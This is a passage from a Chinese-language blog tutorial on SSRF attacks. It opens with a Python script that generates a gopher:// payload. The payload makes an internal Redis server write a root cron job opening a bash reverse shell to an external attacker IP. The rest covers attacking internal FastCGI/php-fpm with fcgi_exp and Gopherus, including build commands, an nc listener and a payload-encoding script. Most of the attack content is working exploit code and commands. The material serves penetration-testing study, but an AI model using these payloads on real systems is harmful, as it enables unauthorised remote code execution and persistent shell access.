<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"192.168.52.131"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">reverse_ip=<span class="string">"47.xxx.xxx.72"</span></span><br><span class="line">reverse_port=<span class="string">"2333"</span></span><br><span class="line">cron=<span class="string">"\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n"</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">"root"</span></span><br><span class="line">path=<span class="string">"/var/spool/cron"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">   <span class="string">"set 1 &#123;&#125;"</span>.format(cron.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">   <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">   <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">   <span class="string">"save"</span></span><br><span class="line">   ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">  cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">  CRLF=<span class="string">"\r\n"</span></span><br><span class="line">  redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">  cmd=<span class="string">""</span></span><br><span class="line">  cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">    cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">  cmd+=CRLF</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += urllib.quote(redis_format(x))</span><br><span class="line">  <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
<h3 id="攻击内网FastCGI"><a href="#攻击内网FastCGI" class="headerlink" title="攻击内网FastCGI"></a>攻击内网FastCGI</h3><p>FastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。</p>
<blockquote>
<p>众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要通过浏览器进行解析，而动态网站需要一个额外的编译解析的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。<br>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它像一个常驻的CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次，所以FastCGI的主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能 。</p>
</blockquote>
<h4 id="使用fcgi-exp工具攻击"><a href="#使用fcgi-exp工具攻击" class="headerlink" title="使用fcgi_exp工具攻击"></a>使用fcgi_exp工具攻击</h4><p>下载地址：<a href="https://github.com/piaca/fcgi_exp" target="_blank" rel="noopener">https://github.com/piaca/fcgi_exp</a><br>这个工具主要是用来攻击未授权访问php-fpm的，可用来测试是否可以直接攻击php-fpm，但需要自己将生成的payload进行转换一下。<br>该工具需要go语言环境，下载后进入目录执行如下命令进行编译：<br><code>go build fcgi_exp.go                    # 编译fcgi_exp.go</code><br>编译完成后，我们在攻击机上使用 nc-lvvp2333&gt;fcg_exp.txt 监听2333 端口来接收fcgi_exp生成的payload，另外再开启一个终端使用下面的命令来向2333端口发送payload：<br><code>./fcgi_exp system 127.0.0.1 2333 /var/www/html/index.php &quot;id&quot;</code><br><img src= "/img/loading.gif" data-src="/img/SSrf/25.png" alt=""></p>
<p>生成的fcg_exp.txt文件的内容是接收到的payload，内容如下：<br><img src= "/img/loading.gif" data-src="/img/SSrf/26.png" alt=""><br>对fcg_exp.txt文件里的payload进行url编码，这里通过如下脚本实现:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote, unquote, urlencode</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'fcg_exp.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">payload = file.read()</span><br><span class="line">print(<span class="string">"gopher://127.0.0.1:9000/_"</span>+quote(payload).replace(<span class="string">"%0A"</span>,<span class="string">"%0D"</span>).replace(<span class="string">"%2F"</span>,<span class="string">"/"</span>))</span><br></pre></td></tr></table></figure>
<p><strong>若是通过GET传参，需要对其进行url二次编码</strong></p>
<h4 id="使用Gopherus工具攻击"><a href="#使用Gopherus工具攻击" class="headerlink" title="使用Gopherus工具攻击"></a>使用Gopherus工具攻击</h4><p>使用Gopherus工具生成攻击FastCGI的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php    <span class="comment"># 这里输入的是一个已知存在的php文件</span></span><br><span class="line">id    <span class="comment"># 输入一个你要执行的命令</span></span><br></pre></td></tr></table></figure>
<p><strong>若是通过GET传参，需要对其进行url二次编码</strong></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">秋兮成風</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2021/04/18/SSRF/">http://yoursite.com/2021/04/18/SSRF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SSRF/">SSRF</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/04/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><img class="next-cover" data-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">内网信息收集</div></div></a></div></nav></article></main><footer id="footer" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 秋兮成風</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><button id="readmode" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font_plus" title="Increase Font Size"><i class="fas fa-plus"></i></button><button id="font_minus" title="Decrease Font Size"><i class="fas fa-minus"></i></button><button class="translate_chn_to_cht" id="translateLink" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
document.body.addEventListener('input', POWERMODE);
</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/third-party/click_heart.js"></script><script>var endLoading = function () {
  document.body.style.overflow = 'auto';
  document.getElementById('loading-box').classList.add("loaded")
}
window.addEventListener('load',endLoading)</script></body></html>